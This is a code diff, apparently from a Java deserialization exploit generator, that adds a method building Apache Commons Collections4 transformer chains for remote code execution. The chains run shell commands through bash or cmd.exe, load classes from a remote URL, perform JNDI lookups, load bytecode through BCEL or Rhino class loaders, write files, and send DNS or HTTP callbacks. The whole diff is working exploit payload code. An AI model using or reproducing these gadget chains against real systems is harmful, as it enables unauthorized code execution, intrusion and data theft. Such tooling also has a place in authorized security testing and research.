@@ -629,6 +629,129 @@ public class Utils {
         return transformers;
     }
 
+    public static org.apache.commons.collections4.Transformer[] makeTransformer4(String command) throws Exception {
+        org.apache.commons.collections4.Transformer[] transformers;
+        String[] execArgs = {command};
+
+        if (command.startsWith("TS-")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(Thread.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"currentThread", null}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{Long.parseLong(command.split("-")[1] + "000")}),
+            };
+        } else if (command.startsWith("RC-")) {
+            String[] strings = handlerCommand(command);
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(URLClassLoader.class),
+                    new org.apache.commons.collections4.functors.InstantiateTransformer(new Class[]{URL[].class}, new Object[]{new URL[]{new URL(strings[0])}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{strings[1]}),
+                    new org.apache.commons.collections4.functors.InstantiateTransformer(null, null)
+            };
+        } else if (command.startsWith("WF-")) {
+            String[] strings = handlerCommand(command);
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(java.io.FileOutputStream.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{strings[0]}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{base64Decode(strings[1]).getBytes()}),
+                    new org.apache.commons.collections4.functors.ConstantTransformer(1)
+            };
+        } else if (command.startsWith("PB-lin")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(ProcessBuilder.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"bash", "-c", base64Decode(command.split("-")[2])}}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("start", new Class[]{}, new Object[]{})
+            };
+        } else if (command.startsWith("PB-win")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(ProcessBuilder.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", base64Decode(command.split("-")[2])}}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("start", new Class[]{}, new Object[]{})
+            };
+        } else if (command.startsWith("SE-")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(ScriptEngineManager.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[0], new Object[0]),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"java.lang.Runtime.getRuntime().exec('" + base64Decode(command.split("-")[1]) + "');"})
+            };
+        } else if (command.startsWith("DL-")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(java.net.InetAddress.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getAllByName", new Class[]{String.class}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{command.split("-")[1]}}),
+                    new org.apache.commons.collections4.functors.ConstantTransformer(1)
+            };
+        } else if (command.startsWith("HL-")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(java.net.URL.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{command.split("-")[1]}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getContent", new Class[0], new Object[0]),
+                    new org.apache.commons.collections4.functors.ConstantTransformer(1)
+            };
+        } else if (command.startsWith("BC-")) {
+            command = command.substring(3);
+            String bcelBytes;
+
+            if (command.startsWith("LF-")) {
+                CtClass ctClass = generateClass(command);
+                bcelBytes = generateBCELFormClassBytes(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode());
+            } else {
+                bcelBytes = command;
+            }
+
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelBytes}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[0], new Object[0]),
+                    new org.apache.commons.collections4.functors.ConstantTransformer(1)
+            };
+        } else if (command.startsWith("JD-")) {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(javax.naming.InitialContext.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("-")[1]}),
+                    new org.apache.commons.collections4.functors.ConstantTransformer(1)
+            };
+        } else if (command.startsWith("LF-")) {
+            CtClass ctClass = generateClass(command);
+
+            if (USING_MOZILLA_DEFININGCLASSLOADER) {
+                transformers = new org.apache.commons.collections4.Transformer[]{
+                        new org.apache.commons.collections4.functors.ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{ctClass.getName(), ctClass.toBytecode()}),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[0], new Object[0]),
+                        new org.apache.commons.collections4.functors.ConstantTransformer(1)
+                };
+            } else {
+                transformers = new org.apache.commons.collections4.Transformer[]{
+                        new org.apache.commons.collections4.functors.ConstantTransformer(ScriptEngineManager.class),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("newInstance", new Class[0], new Object[0]),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"JavaScript"}),
+                        new org.apache.commons.collections4.functors.InvokerTransformer("eval", new Class[]{String.class}, new Object[]{getJSEngineValue(encapsulationByClassLoaderTemplate(ctClass.toBytecode()).toBytecode())})
+                };
+            }
+        } else {
+            transformers = new org.apache.commons.collections4.Transformer[]{
+                    new org.apache.commons.collections4.functors.ConstantTransformer(Runtime.class),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                    new org.apache.commons.collections4.functors.InvokerTransformer("exec", new Class[]{String.class}, execArgs),
+                    new org.apache.commons.collections4.functors.ConstantTransformer(1)
+            };
+        }
+        return transformers;
+    }
+
     public static String makeClojurePayload(String command) {
         if (command.startsWith("TS-"))
             return "(java.lang.Thread/sleep " + (Integer.parseInt(command.split("-")[1]) * 1000) + ")";
